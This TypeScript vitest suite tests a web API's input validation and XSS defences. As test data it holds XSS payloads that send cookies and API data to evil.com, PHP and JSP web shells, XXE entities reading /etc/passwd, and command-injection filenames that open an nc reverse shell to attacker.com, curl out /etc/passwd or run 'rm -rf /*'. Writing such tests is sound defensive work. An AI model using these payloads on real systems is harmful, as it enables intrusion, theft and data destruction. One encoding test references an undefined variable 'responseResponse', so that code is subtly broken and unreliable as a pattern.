/**
 * Input Validation and XSS Protection Security Tests
 *
 * This test suite validates input validation mechanisms and XSS protection
 * including reflected, stored, and DOM-based XSS vulnerabilities.
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import { TestHelper } from '../utils/test-helper';

describe('Input Validation Security Tests', () => {
  let testHelper: TestHelper;
  let authToken: string;

  beforeAll(async () => {
    testHelper = new TestHelper();
    await testHelper.setupTestEnvironment();

    const loginResponse = await testHelper.loginUser('test@example.com', 'SecurePass123!');
    authToken = loginResponse.body.token;
  });

  afterAll(async () => {
    await testHelper.cleanupTestEnvironment();
  });

  beforeEach(async () => {
    await testHelper.resetTestState();
  });

  describe('Buffer Overflow Protection', () => {
    it('should handle overly long text inputs', async () => {
      const longStrings = [
        'a'.repeat(10000),    // 10KB
        'a'.repeat(100000),   // 100KB
        'a'.repeat(1000000),  // 1MB
        'a'.repeat(10000000)  // 10MB
      ];

      for (const longString of longStrings) {
        const response = await testHelper.makeRequest('POST', '/api/projects', {
          name: longString,
          description: 'Test project with long name'
        }, true);

        // Should either accept with truncation or reject
        expect([200, 400, 413]).toContain(response.status);
        if (response.status === 400) {
          expect(response.body.error).toMatch(/too long|exceeds|limit/i);
        }
      }
    });

    it('should validate maximum field lengths', async () => {
      const fieldTests = [
        { field: 'username', maxLength: 50, value: 'a'.repeat(100) },
        { field: 'email', maxLength: 254, value: 'a'.repeat(300) + '@test.com' },
        { field: 'phone', maxLength: 20, value: '1'.repeat(50) },
        { field: 'title', maxLength: 200, value: 'a'.repeat(500) },
        { field: 'description', maxLength: 10000, value: 'a'.repeat(20000) }
      ];

      for (const test of fieldTests) {
        const endpoint = test.field === 'username' ? '/api/auth/register' : '/api/profile';
        const data = { [test.field]: test.value };

        if (test.field !== 'username') {
          data.email = 'test@example.com';
        }

        const response = await testHelper.makeRequest('POST', endpoint, data, true);

        expect([400, 422]).toContain(response.status);
        expect(response.body.error).toMatch(/too long|exceeds.*limit/i);
      }
    });

    it('should handle numeric overflow', async () => {
      const numericValues = [
        '99999999999999999999999999999999999999999999999999',
        '-99999999999999999999999999999999999999999999999999',
        '1e308',
        '1.7976931348623157e+308', // Number.MAX_VALUE
        '1.7976931348623159e+308', // Overflow
        'NaN',
        'Infinity',
        '-Infinity'
      ];

      for (const value of numericValues) {
        const response = await testHelper.makeRequest('POST', '/api/tests', {
          name: 'Test with numeric value',
          timeout: value
        }, true);

        // Should handle gracefully
        expect([200, 400, 422]).toContain(response.status);
        if ([400, 422].includes(response.status)) {
          expect(response.body.error).toBeDefined();
        }
      }
    });

    it('should prevent array injection', async () => {
      const arrayPayloads = [
        { field: 'name', value: ['admin', 'user'] },
        { field: 'role', value: ['admin'] },
        { field: 'permissions', value: ['read', 'write', 'delete'] },
        { field: 'id', value: [1, 2, 3] }
      ];

      for (const payload of arrayPayloads) {
        const response = await testHelper.makeRequest('POST', '/api/projects', {
          [payload.field]: payload.value,
          description: 'Test with array injection'
        }, true);

        // Should reject unexpected arrays
        expect([400, 422]).toContain(response.status);
      }
    });
  });

  describe('Special Character Handling', () => {
    it('should handle Unicode characters properly', async () => {
      const unicodeInputs = [
        '🔒💻🛡️', // Emojis
        'áéíóú', // Accented characters
        'ñöüß', // Special European characters
        '中文测试', // Chinese characters
        'العربية', // Arabic characters
        'עברית', // Hebrew characters
        'русский', // Cyrillic characters
        '🤝🔐🔒', // Security-related emojis
        '\u0000\u0001\u0002', // Control characters
        '\uFEFF\u200B\u200C', // Zero-width characters
        '\u202E\u202D\u202A', // Direction control characters
        '\uFFF9\uFFFA\uFFFB', // Interlinear annotation characters
        '\u0300\u0301\u0302' // Combining characters
      ];

      for (const input of unicodeInputs) {
        const response = await testHelper.makeRequest('POST', '/api/projects', {
          name: input,
          description: 'Test with Unicode characters'
        }, true);

        // Should handle Unicode safely
        expect([200, 400, 422]).toContain(response.status);
        if (response.status === 200) {
          expect(response.body.name).toBeDefined();
        }
      }
    });

    it('should sanitize control characters', async () => {
      const controlChars = [
        '\x00\x01\x02\x03\x04\x05', // Control characters
        '\r\n\t\f\v', // Whitespace control
        '\u0007\u0008\u000B\u000C\u000E', // More controls
        '\u001B\u007F\u009F' // Escape and delete
      ];

      for (const chars of controlChars) {
        const response = await testHelper.makeRequest('POST', '/api/projects', {
          name: `Test${chars}Name`,
          description: 'Test with control characters'
        }, true);

        // Should either sanitize or reject
        if (response.status === 200) {
          // Should not contain raw control characters
          expect(response.body.name).not.toMatch(/[\x00-\x1F\x7F]/);
        } else {
          expect([400, 422]).toContain(response.status);
        }
      }
    });

    it('should prevent script injection through special characters', async () => {
      const scriptPayloads = [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        'vbscript:msgbox("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<body onload=alert("XSS")>',
        '<input autofocus onfocus=alert("XSS")>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
        '<keygen onfocus=alert("XSS") autofocus>',
        '<video><source onerror="alert(\'XSS\')">',
        '<details open ontoggle=alert("XSS")>',
        '<marquee onstart=alert("XSS")>'
      ];

      for (const payload of scriptPayloads) {
        const response = await testHelper.makeRequest('POST', '/api/projects', {
          name: payload,
          description: 'Test with script injection'
        }, true);

        if (response.status === 200) {
          // Should be escaped or sanitized
          expect(response.body.name).not.toContain('<script>');
          expect(response.body.name).not.toContain('javascript:');
          expect(response.body.name).not.toContain('onerror=');
          expect(response.body.name).not.toContain('onload=');
        }
      }
    });
  });

  describe('File Upload Validation', () => {
    it('should validate file types', async () => {
      const maliciousFiles = [
        { name: 'shell.php', type: 'application/x-php', content: '<?php system($_GET["cmd"]); ?>' },
        { name: 'backdoor.jsp', type: 'application/x-jsp', content: '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
        { name: 'script.py', type: 'text/x-python', content: 'import os; os.system(request.args.get("cmd"))' },
        { name: 'exploit.sh', type: 'application/x-sh', content: '#!/bin/bash\n$1' },
        { name: 'malicious.exe', type: 'application/x-executable', content: 'MZ\x90\x00' },
        { name: 'virus.scr', type: 'application/octet-stream', content: 'S\x00' }
      ];

      for (const file of maliciousFiles) {
        const formData = new FormData();
        const blob = new Blob([file.content], { type: file.type });
        formData.append('file', blob, file.name);
        formData.append('projectId', '123');

        const response = await testHelper.makeRequest('POST', '/api/files/upload', formData, true, {
          'Content-Type': 'multipart/form-data'
        });

        // Should reject malicious file types
        expect([400, 422]).toContain(response.status);
        expect(response.body.error).toMatch(/file type|not allowed|invalid/i);
      }
    });

    it('should validate file sizes', async () => {
      const largeSizes = [
        10 * 1024 * 1024,   // 10MB
        50 * 1024 * 1024,   // 50MB
        100 * 1024 * 1024,  // 100MB
        1024 * 1024 * 1024  // 1GB
      ];

      for (const size of largeSizes) {
        const largeContent = 'x'.repeat(size);
        const formData = new FormData();
        const blob = new Blob([largeContent], { type: 'text/plain' });
        formData.append('file', blob, 'large.txt');
        formData.append('projectId', '123');

        const response = await testHelper.makeRequest('POST', '/api/files/upload', formData, true, {
          'Content-Type': 'multipart/form-data'
        });

        // Should reject files that are too large
        expect([400, 413, 422]).toContain(response.status);
        expect(response.body.error).toMatch(/too large|exceeds|size/i);
      }
    });

    it('should sanitize file names', async () => {
      const maliciousNames = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'file<script>alert("XSS")</script>.txt',
        'file\u0000.txt',
        'CON.txt', // Windows reserved name
        'AUX.txt', // Windows reserved name
        'file|pipe.txt',
        'file?.txt',
        'file*.txt',
        'file".txt',
        'file:.txt',
        'file>.txt',
        'file<.txt'
      ];

      for (const name of maliciousNames) {
        const formData = new FormData();
        const blob = new Blob(['test content'], { type: 'text/plain' });
        formData.append('file', blob, name);
        formData.append('projectId', '123');

        const response = await testHelper.makeRequest('POST', '/api/files/upload', formData, true, {
          'Content-Type': 'multipart/form-data'
        });

        if (response.status === 200) {
          // Filename should be sanitized
          expect(response.body.filename).not.toBe(name);
          expect(response.body.filename).not.toContain('..');
          expect(response.body.filename).not.toContain('<script>');
        }
      }
    });

    it('should scan uploaded files for malware', async () => {
      // Mock EICAR test signature (standard antivirus test file)
      const eicarSignature = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';

      const formData = new FormData();
      const blob = new Blob([eicarSignature], { type: 'text/plain' });
      formData.append('file', blob, 'eicar.txt');
      formData.append('projectId', '123');

      const response = await testHelper.makeRequest('POST', '/api/files/upload', formData, true, {
        'Content-Type': 'multipart/form-data'
      });

      // Should detect and block malware signatures
      expect([400, 422]).toContain(response.status);
      expect(response.body.error).toMatch(/malware|virus|dangerous/i);
    });
  });

  describe('JSON and XML Injection', () => {
    it('should prevent JSON injection', async () => {
      const jsonPayloads = [
        '{"name": "test", "admin": true}',
        '{"name": "test", "role": "admin"}',
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
        '{"name": "test", "$where": "this.role == \'admin\'"}',
        '{"name": {"$ne": null}, "password": {"$ne": null}}'
      ];

      for (const payload of jsonPayloads) {
        const response = await testHelper.makeRequest('POST', '/api/projects', JSON.parse(payload), true);

        // Should handle prototype pollution attempts
        if (response.status === 200) {
          expect(response.body.admin).toBeUndefined();
          expect(response.body.role).not.toBe('admin');
        }
      }
    });

    it('should prevent XML injection', async () => {
      const xmlPayloads = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><project><name>&xxe;</name></project>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.service/api">]><project><name>&xxe;</name></project>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><project><name>&test;</name></project>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><data>&xxe;</data>',
        '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd">]><message><text>&ent;</text></message>'
      ];

      for (const payload of xmlPayloads) {
        const response = await testHelper.makeRequest('POST', '/api/import/xml', {
          xml: payload
        }, true);

        // Should reject XXE attempts
        expect([400, 422]).toContain(response.status);
      }
    });

    it('should prevent parameter pollution', async () => {
      const pollutionTests = [
        { endpoint: '/api/projects', params: 'name=test&name=admin' },
        { endpoint: '/api/users', params: 'id=123&id=456' },
        { endpoint: '/api/search', params: 'q=test&q=admin' },
        { endpoint: '/api/auth/login', params: 'username=user&username=admin' }
      ];

      for (const test of pollutionTests) {
        const response = await testHelper.makeRequest('POST', test.endpoint + '?' + test.params, {}, true);

        // Should handle parameter pollution safely
        expect([200, 400, 422]).toContain(response.status);
        if (response.status === 200) {
          // Should not accept malicious parameter values
          expect(response.body.admin).toBeUndefined();
          expect(response.body.role).not.toBe('admin');
        }
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection in file names', async () => {
      const commandPayloads = [
        'test.txt; ls -la',
        'test.txt && cat /etc/passwd',
        'test.txt | nc attacker.com 4444 -e /bin/sh',
        'test.txt`whoami`',
        'test.txt$(id)',
        'test.txt; rm -rf /*',
        'test.txt && curl http://evil.com/steal?data=$(cat /etc/passwd)',
        'test.txt|python -c "import os; os.system(\'ls /\')"'
      ];

      for (const payload of commandPayloads) {
        const formData = new FormData();
        const blob = new Blob(['test'], { type: 'text/plain' });
        formData.append('file', blob, payload);
        formData.append('projectId', '123');

        const response = await testHelper.makeRequest('POST', '/api/files/upload', formData, true, {
          'Content-Type': 'multipart/form-data'
        });

        // Should sanitize or reject command injection attempts
        if (response.status === 200) {
          expect(response.body.filename).not.toContain(';');
          expect(response.body.filename).not.toContain('&&');
          expect(response.body.filename).not.toContain('|');
          expect(response.body.filename).not.toContain('`');
          expect(response.body.filename).not.toContain('$(');
        }
      }
    });

    it('should validate API endpoint parameters', async () => {
      const endpointTests = [
        { path: '/api/projects/search', params: { query: 'test; rm -rf /' } },
        { path: '/api/tests/run', params: { command: 'test && cat /etc/passwd' } },
        { path: '/api/export', params: { format: 'pdf; nc evil.com 4444 < /etc/passwd' } },
        { path: '/api/system/exec', params: { cmd: 'ls -la; whoami' } }
      ];

      for (const test of endpointTests) {
        const response = await testHelper.makeRequest('POST', test.path, test.params, true);

        // Should reject command injection attempts
        expect([400, 422, 403, 404]).toContain(response.status);
      }
    });
  });
});

describe('XSS Protection Tests', () => {
  let testHelper: TestHelper;
  let authToken: string;

  beforeAll(async () => {
    testHelper = new TestHelper();
    await testHelper.setupTestEnvironment();

    const loginResponse = await testHelper.loginUser('test@example.com', 'SecurePass123!');
    authToken = loginResponse.body.token;
  });

  afterAll(async () => {
    await testHelper.cleanupTestEnvironment();
  });

  describe('Reflected XSS Protection', () => {
    it('should sanitize reflected XSS in parameters', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload=alert("XSS")>',
        '<input autofocus onfocus=alert("XSS")>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>'
      ];

      for (const payload of xssPayloads) {
        // Test in search parameters
        const searchResponse = await testHelper.makeRequest('GET', `/api/search?q=${encodeURIComponent(payload)}`, {}, true);

        if (searchResponse.status === 200) {
          // Should be escaped in response
          const responseText = JSON.stringify(searchResponse.body);
          expect(responseText).not.toContain('<script>');
          expect(responseText).not.toContain('onerror=');
          expect(responseText).not.toContain('onload=');
          expect(responseText).not.toContain('javascript:');
        }

        // Test in error pages
        const errorResponse = await testHelper.makeRequest('GET', `/api/nonexistent?error=${encodeURIComponent(payload)}`, {});

        // Error pages should also be sanitized
        if (errorResponse.status === 404 || errorResponse.status === 500) {
          const errorText = JSON.stringify(errorResponse.body);
          expect(errorText).not.toContain('<script>');
          expect(errorText).not.toContain('onerror=');
        }
      }
    });

    it('should handle encoding-based XSS', async () => {
      const encodedPayloads = [
        '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E', // URL encoded
        '%26%2360%3Bscript%26%2362%3Balert%28%26%2334%3BXSS%26%2334%3B%29%26%2360%3B%2Fscript%26%2362%3B', // HTML entity encoded
        '\\x3Cscript\\x3Ealert\\x28\\x22XSS\\x22\\x29\\x3C\\x2Fscript\\x3E', // Hex encoded
        '\\u003Cscript\\u003Ealert\\u0028\\u0022XSS\\u0022\\u0029\\u003C\\u002Fscript\\u003E', // Unicode encoded
        '&#60;script&#62;alert&#40;&#34;XSS&#34;&#41;&#60;&#47;script&#62;' // Decimal entity encoded
      ];

      for (const payload of encodedPayloads) {
        const response = await testHelper.makeRequest('GET', `/api/search?q=${payload}`, {}, true);

        if (response.status === 200) {
          // Should handle all encodings safely
          const responseText = JSON.stringify(responseResponse.body);
          expect(responseText).not.toMatch(/<script[^>]*>.*alert.*<\/script>/i);
        }
      }
    });

    it('should sanitize XSS in HTTP headers', async () => {
      const maliciousHeaders = [
        { name: 'User-Agent', value: '<script>alert("XSS")</script>' },
        { name: 'Referer', value: 'javascript:alert("XSS")' },
        { name: 'X-Forwarded-For', value: '<img src=x onerror=alert("XSS")>' },
        { name: 'X-Requested-With', value: '<script>alert("XSS")</script>' }
      ];

      for (const header of maliciousHeaders) {
        const response = await testHelper.makeRequest('GET', '/api/profile', {}, true, {
          [header.name]: header.value
        });

        // Headers should be handled safely
        expect([200, 400, 422]).toContain(response.status);
      }
    });
  });

  describe('Stored XSS Protection', () => {
    it('should sanitize stored XSS in user-generated content', async () => {
      const storedXSSPayloads = [
        '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
        '<img src=x onerror="fetch(\'http://evil.com/steal?data=\'+document.cookie)">',
        '<svg onload="fetch(\'/api/admin/users\').then(r=>r.json()).then(d=>fetch(\'http://evil.com/\', {method:\'POST\',body:JSON.stringify(d)}))">',
        '<iframe src="/api/secret-data" onload="this.contentWindow.postMessage(data,\'*\')"></iframe>',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        '<style>@import "javascript:alert(\'XSS\')";</style>',
        '<details open ontoggle="fetch(\'/api/sensitive-data\')"></details>'
      ];

      for (const payload of storedXSSPayloads) {
        // Store malicious content
        const storeResponse = await testHelper.makeRequest('POST', '/api/projects', {
          name: 'Test Project',
          description: payload
        }, true);

        expect(storeResponse.status).toBe(200);

        // Retrieve content
        const retrieveResponse = await testHelper.makeRequest('GET', `/api/projects/${storeResponse.body.id}`, {}, true);

        expect(retrieveResponse.status).toBe(200);

        // Should be sanitized
        const description = retrieveResponse.body.description;
        expect(description).not.toContain('<script>');
        expect(description).not.toContain('onerror=');
        expect(description).not.toContain('onload=');
        expect(description).not.toContain('javascript:');
      }
    });

    it('should sanitize XSS in comments and reviews', async () => {
      const commentPayloads = [
        '<script>stealData()</script>',
        '<img src=x onerror="alert(\'XSS\')">',
        '<script src="http://evil.com/malicious.js"></script>',
        '<body onload="fetch(\'/api/users\')">',
        '<input onfocus="alert(\'XSS\')" autofocus>'
      ];

      for (const payload of commentPayloads) {
        // Post comment
        const commentResponse = await testHelper.makeRequest('POST', `/api/projects/123/comments`, {
          content: payload,
          rating: 5
        }, true);

        if (commentResponse.status === 200 || commentResponse.status === 201) {
          // Retrieve comments
          const getCommentsResponse = await testHelper.makeRequest('GET', `/api/projects/123/comments`, {}, true);

          if (getCommentsResponse.status === 200) {
            const comments = getCommentsResponse.body;
            const comment = comments.find((c: any) => c.content.includes('XSS') || c.content.includes('script'));

            if (comment) {
              // Should be sanitized
              expect(comment.content).not.toMatch(/<script[^>]*>/);
              expect(comment.content).not.toMatch(/on\w+\s*=/);
            }
          }
        }
      }
    });

    it('should sanitize XSS in user profiles', async () => {
      const profileXSSPayloads = [
        { field: 'bio', value: '<script>alert("XSS")</script>' },
        { field: 'displayName', value: '<img src=x onerror=alert("XSS")>' },
        { field: 'location', value: 'javascript:alert("XSS")' },
        { field: 'website', value: '<script>fetch("/api/users")</script>' }
      ];

      for (const fieldTest of profileXSSPayloads) {
        // Update profile with XSS
        const updateResponse = await testHelper.makeRequest('PUT', '/api/profile', fieldTest, true);

        expect(updateResponse.status).toBe(200);

        // Retrieve profile
        const getProfileResponse = await testHelper.makeRequest('GET', '/api/profile', {}, true);

        expect(getProfileResponse.status).toBe(200);

        // Should be sanitized
        const fieldValue = getProfileResponse.body[fieldTest.field];
        if (fieldValue) {
          expect(fieldValue).not.toContain('<script>');
          expect(fieldValue).not.toContain('onerror=');
          expect(fieldValue).not.toContain('javascript:');
        }
      }
    });
  });

  describe('DOM-Based XSS Protection', () => {
    it('should prevent DOM-based XSS in client-side rendering', async () => {
      // This would typically be tested in browser/E2E tests
      // Here we test that server provides safe data
      const domXSSPayloads = [
        '#<script>alert("XSS")</script>',
        '#javascript:alert("XSS")',
        '#<img src=x onerror=alert("XSS")>',
        '#<svg onload=alert("XSS")>',
        '#<iframe src="javascript:alert(\'XSS\')"></iframe>'
      ];

      for (const payload of domXSSPayloads) {
        // Test that server doesn't render unsafe content in templates
        const response = await testHelper.makeRequest('GET', `/api/redirect${payload}`, {}, true);

        // Should handle safely
        expect([200, 400, 422]).toContain(response.status);
        if (response.status === 200) {
          expect(response.body.redirect).not.toContain('<script>');
          expect(response.body.redirect).not.toContain('javascript:');
        }
      }
    });

    it('should validate JSON responses for XSS', async () => {
      // Test that API responses don't contain executable content
      const endpoints = [
        '/api/projects',
        '/api/tests',
        '/api/users/me',
        '/api/search?q=test'
      ];

      for (const endpoint of endpoints) {
        const response = await testHelper.makeRequest('GET', endpoint, {}, true);

        if (response.status === 200) {
          const jsonStr = JSON.stringify(response.body);

          // Check for potential XSS vectors
          expect(jsonStr).not.toMatch(/<script[^>]*>/i);
          expect(jsonStr).not.toMatch(/on\w+\s*=/i);
          expect(jsonStr).not.toMatch(/javascript:/i);
          expect(jsonStr).not.toMatch(/vbscript:/i);
          expect(jsonStr).not.toMatch(/data:text\/html/i);
        }
      }
    });
  });

  describe('Content Security Policy', () => {
    it('should implement CSP headers', async () => {
      const response = await testHelper.makeRequest('GET', '/', {});

      // Check for CSP header
      const cspHeader = response.headers['content-security-policy'];
      expect(cspHeader).toBeDefined();

      // Should have basic CSP directives
      expect(cspHeader).toMatch(/default-src/);
      expect(cspHeader).toMatch(/script-src/);
      expect(cspHeader).toMatch(/style-src/);
    });

    it('should prevent inline script execution', async () => {
      const response = await testHelper.makeRequest('GET', '/', {});
      const cspHeader = response.headers['content-security-policy'];

      if (cspHeader) {
        // Should not allow unsafe-inline
        expect(cspHeader).not.toMatch(/script-src\s+[^']*'unsafe-inline'/);
      }
    });

    it('should prevent eval() usage', async () => {
      const response = await testHelper.makeRequest('GET', '/', {});
      const cspHeader = response.headers['content-security-policy'];

      if (cspHeader) {
        // Should not allow unsafe-eval
        expect(cspHeader).not.toMatch(/script-src\s+[^']*'unsafe-eval'/);
      }
    });
  });

  describe('X-XSS-Protection Header', () => {
    it('should set X-XSS-Protection header', async () => {
      const response = await testHelper.makeRequest('GET', '/', {});

      const xssProtection = response.headers['x-xss-protection'];
      expect(xssProtection).toBeDefined();
      expect(xssProtection).toBe('1; mode=block');
    });
  });
});

export {};
